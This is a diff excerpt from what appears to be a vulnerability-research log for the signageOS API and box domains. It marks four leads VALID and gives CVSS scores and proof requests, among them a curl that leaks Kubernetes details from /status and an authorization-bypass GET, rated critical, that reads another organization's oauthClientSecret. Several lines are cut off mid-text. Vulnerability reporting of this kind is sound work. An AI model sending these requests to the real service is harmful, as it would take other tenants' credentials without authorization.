@@ -997,3 +997,9 @@
   - | C | `box CORS` `GET / -H Origin:https://evil.test` `GET /login/ 200` 17-18 static `ACAO` `inventory/signageos.md:39` | YES | YES | YES trust-expansion (no `ACAC` → no cookie theft) `C:L` | YES `-i g
   - | D | `box CSP` `GET /login/%2F` `content-security-policy` 40-59 `connect-src/frame-src` triplicated `oauth/token` + `*.sentry` `*.mapbox` S3 `execute-api` `inventory/signageos.md:24` | YES | YES | YE
   - | E | `api POST /v1/organization/{uid}/security-token` BOLA `reports/security-token-idor-report.md:28` `X-Auth {orgUid}:{secret}` prefix != path `{uid}` | YES | YES `PR:L` low-priv account `X-Auth` | 
+
+- 4 lead(s) marked VALID at 2026-09-05 01:09:28 UTC
+  - **Verdict: VALID (LOW)** - `box.signageos.io/status` leaks K8s infra. CVSS3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` **5.3** (Info). Proof: `curl -s -D - https://box.signageos.io/status | grep -E "host
+  - **Verdict: VALID (LOW)** - same class, differential hardening `HSTS/xfo/xcto/no-store secgrep=4` vs box `0`. Proof: `GET https://api.signageos.io/status` `200`. CVSS **5.3** same vector. Channel same.
+  - **Verdict: VALID (HIGH)** - Critical logic flaw. Minimal proof (read-only, own orgs only): `1 sos login -> X-Auth pair 2 GET https://api.signageos.io/v1/organization/<own>/security-token -H "X-Auth: .
+  - **Verdict: VALID (CRITICAL)** - linked to Lead 4 but superset. Proof: `GET https://api.signageos.io/v1/organization/<foreign-uid> -H "X-Auth: <ownAcct>"` -> `200 {"oauthClientSecret":...}` vs expected
